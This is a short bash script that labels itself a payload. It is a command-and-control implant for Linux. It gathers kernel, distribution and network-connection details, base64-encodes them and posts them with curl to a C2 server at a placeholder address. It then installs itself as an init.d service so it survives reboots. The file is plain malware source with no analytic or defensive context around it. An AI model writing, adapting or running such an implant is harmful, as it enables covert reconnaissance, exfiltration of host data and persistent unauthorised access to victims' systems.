#!/bin/bash

C2Server="https://your-c2-server.com"
AgentID=614b9afd-39b9-4861-b37a-90c00255880b

encrypt_data() {
    local data="$1"
    echo "$data" | base64
}

decrypt_data() {
    local data="$1"
    echo "$data" | base64 --decode
}

write_log() {
    local message="$1"
    echo "$message"
}

send_data() {
    local endpoint="$1"
    local data="$2"
    local encrypted_data
    encrypted_data=$(encrypt_data "$data")
    curl -k -X POST "$C2Server/$endpoint" -d "$encrypted_data" -H "Content-Type: application/json"
}

gather_system_info() {
    uname -a > /tmp/sysinfo.txt
    lsb_release -a >> /tmp/sysinfo.txt
    cat /tmp/sysinfo.txt
}

list_network_connections() {
    netstat -an > /tmp/netstat.txt
    cat /tmp/netstat.txt
}

establish_persistence() {
    local script_path="/etc/init.d/linux_payload.sh"
    cp "$0" "$script_path"
    chmod +x "$script_path"
    update-rc.d linux_payload.sh defaults
}

main() {
    write_log "Payload started. ID: $AgentID"
    
    system_info=$(gather_system_info)
    network_connections=$(list_network_connections)
    
    data=$(cat <<EOF
{
    "AgentID": "$AgentID",
    "SystemInfo": "$system_info",
    "NetworkConnections": "$network_connections"
}
EOF
)
    
    send_data "report" "$data"
    establish_persistence
}

main
